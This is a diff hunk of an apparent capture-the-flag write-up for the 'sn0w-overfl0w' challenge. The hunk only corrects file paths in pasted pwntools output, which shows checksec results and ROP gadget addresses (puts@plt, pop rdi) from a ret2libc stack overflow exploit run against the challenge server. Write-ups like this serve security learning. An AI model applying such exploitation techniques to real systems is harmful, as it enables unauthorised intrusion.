@@ -146,19 +146,19 @@ p.interactive()
 ```
 fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# python xpl.py      
 [+] Opening connection to challs.xmas.htsp.ro on port 12006: Done
-[*] '/home/fex0r/.ctf/xmas-ctf/writeups/sn0w-overfl0w/chall'
+[*] '/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-[*] '/home/fex0r/.ctf/xmas-ctf/writeups/sn0w-overfl0w/libc-2.27.so'
+[*] '/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/libc-2.27.so'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[*] Loading gadgets for '/home/fex0r/.ctf/xmas-ctf/writeups/sn0w-overfl0w/chall'
+[*] Loading gadgets for '/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall'
 [*] puts@plt => 0x40102c
 [*] __libc_start_main => 0x403ff0
 [*] pop rdi => 0x401273
